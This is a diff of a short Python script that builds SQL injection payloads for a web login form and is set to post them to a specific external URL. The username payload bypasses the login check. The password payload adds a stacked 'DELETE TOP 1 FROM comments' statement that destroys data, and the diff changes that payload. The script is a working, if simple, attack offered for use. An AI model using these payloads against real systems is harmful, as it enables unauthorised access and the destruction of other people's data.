@@ -1,13 +1,12 @@
 import mysql.connector
+import requests
 
-print('ahoj')
 usernameField = 'anything\' OR \'x\'=\'x'
-passwordField = 'anything\' OR \'x\'=\'x\'; DELETE FROM comments WHERE id = \'1\'; --'
+passwordField = 'anything\' OR \'x\'=\'x\'; DELETE TOP 1 FROM comments ; --'
 
-from twill.commands import *
 print(usernameField)
 print(passwordField)
-import requests
+
 url = 'http://apache1.willilazarov.cz/'
 values = {'username': usernameField ,
           'password': passwordField }
